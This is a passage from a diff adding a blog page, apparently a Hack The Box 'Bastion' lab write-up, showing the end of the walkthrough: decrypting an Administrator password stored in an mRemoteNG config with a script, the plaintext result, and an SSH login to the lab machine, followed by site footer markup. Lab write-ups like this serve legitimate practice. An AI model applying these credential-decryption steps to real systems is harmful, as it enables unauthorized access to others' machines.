+me=”Administrator” Domain=”” Password=”aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==”
+Hostname=”127.0.0.1&quot;
+</code></pre>
+<p>There’s plenty of ways to “decrypt” the password, the ones mentioned by the hackersvanguard page or using this python script.<br>Once decrypted you’ll have the password, be able to ssh into the box as administrator, grab the flag and call it a day! :)  </p>
+<pre><code>root@kek:~/htb/bastion/mremoteng-decrypt# python3 mremoteng_decrypt.py -s “aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==”
+Password: thXLHM96BeKL0ER2
+root@kek:~/htb/bastion/mremoteng-decrypt# ssh administrator@10.10.10.134
+administrator@10.10.10.134’s password:
+</code></pre>
+<div class="image main"> <p><img src="/assets/images/bastion6.jpg" alt="user"></p></div>
+
+<p>Hope this was at someway useful, informative perhaps. Even though this is a bit of an old box it’s always good to go back and practice a bit.<br>Keep in consideration I am not by any means an expert or highly efficient on this yet and a lot of the process was trimmed in order to keep the post as short as I could.<br>Hopefully I will be uploading a write up for retired machiones, every Monday from now on until end of year (Which the target is the OSCP exam) :) Thanks for taking the time to read this or skip here too!</p>
+<p>**</p>
+<p>Hack the planet! x)</p>
+<p>**</p>
+<div class="image">![user](1_8WINeDA9BY08yp2xvoQGIQ.jpg)</div>
+
+</section>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2021/08/02/HTB-Resolute-Write-Up/"
+                    data-tooltip="HTB Resolute Write Up"
+                    aria-label="PREVIOUS: HTB Resolute Write Up"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2021/08/02/Blog-under-maintenance-due-technology-change/"
+                    data-tooltip="Blog under maintenance due technology change 08/02 - ???"
+                    aria-label="NEXT: Blog under maintenance due technology change 08/02 - ???"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://lebaphomet.github.io/2021/08/02/HTB-Bastion-Write-Up/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://lebaphomet.github.io/2021/08/02/HTB-Bastion-Write-Up/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2021 Rodhnny Acosta. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2021/08/02/HTB-Resolute-Write-Up/"
+                    data-tooltip="HTB Resolute Write Up"
+                    aria-label="PREVIOUS: HTB Resolute Write Up"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2021/08/02/Blog-under-maintenance-due-technology-change/"
+                    data-tooltip="Blog under maintenance due technology change 08/02 - ???"
+                    aria-label="NEXT: Blog under maintenance due technology change 08/02 - ???"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://lebaphomet.github.io/2021/08/02/HTB-Bastion-Write-Up/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://lebaphomet.github.io/2021/08/02/HTB-Bastion-Write-Up/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=https://lebaphomet.github.io/2021/08/02/HTB-Bastion-Write-Up/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://lebaphomet.github.io/2021/08/02/HTB-Bastion-Write-Up/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="https://www.seekpng.com/png/full/168-1680719_cute-baphomet.png" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">Rodhnny Acosta</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-faa9h81r1hw6if6wivnmvdymzpxxnb6w6asgxk8dkaef0htwnpdvgn825yuu.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+    
+
+
+
+
+    </body>
+</html>
